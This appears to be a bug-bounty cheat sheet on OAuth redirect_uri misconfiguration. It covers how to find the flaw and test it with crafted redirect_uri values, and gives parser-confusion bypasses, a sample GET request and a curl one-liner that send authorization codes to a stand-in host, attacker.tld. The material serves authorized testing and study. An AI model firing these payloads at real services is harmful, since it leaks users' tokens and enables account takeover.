# OAuth — redirect_uri Misconfiguration

## 📌 What It Is
Authorization servers accept arbitrary or partial-match redirect_uri values, leaking authorization codes or tokens to attacker.

## 🔍 How to Find It
Find OAuth flow (look for `/oauth/authorize`, `client_id`, `redirect_uri`). Try modifying redirect_uri to attacker domain or attacker-controlled subdomain of allowed.

## 🧪 How to Test It
1. Initiate flow with `redirect_uri=https://allowed.tld@attacker.tld`\n2. With `redirect_uri=https://allowed.tld.attacker.tld`\n3. With `redirect_uri=https://attacker.tld#allowed.tld`\n4. With path bypass `redirect_uri=https://allowed.tld/callback/../../attacker.tld`

## 💣 How to Exploit It
If allowed → you receive `code` or `token` → exchange for access token → ATO of victim account.

## 🔄 Bypass Techniques
URL parser confusion: backslash, `@`, `#`, `?`, double-encoding. Subdomain takeover on `forgotten.allowed.tld`. Open redirect chain in callback path.

## 🛠️ Tools
- Burp + manual fuzz\n- ssrf-king (postauth)\n- nuclei oauth templates

## 🎯 Payloads
```\nGET /oauth/authorize?client_id=X&redirect_uri=https://attacker.tld&response_type=code&state=...\n```

## 📝 Real-World Examples
Salt Labs OAuth research, multiple Apple/Google/Facebook H1 reports.

## 🚩 Common Mistakes / Traps
Don't conflate with CSRF in OAuth — different vector. Validate `state` is bound to session.

## 📊 Severity & Impact
Critical (8-10) for ATO.

## 🔗 References
RFC 6749, oauth.net, Daniel Fett's OAuth security research.

## ⚡ One-Liners
```bash\ncurl -i 'https://target/oauth/authorize?client_id=X&redirect_uri=https://attacker.tld&response_type=code'\n```
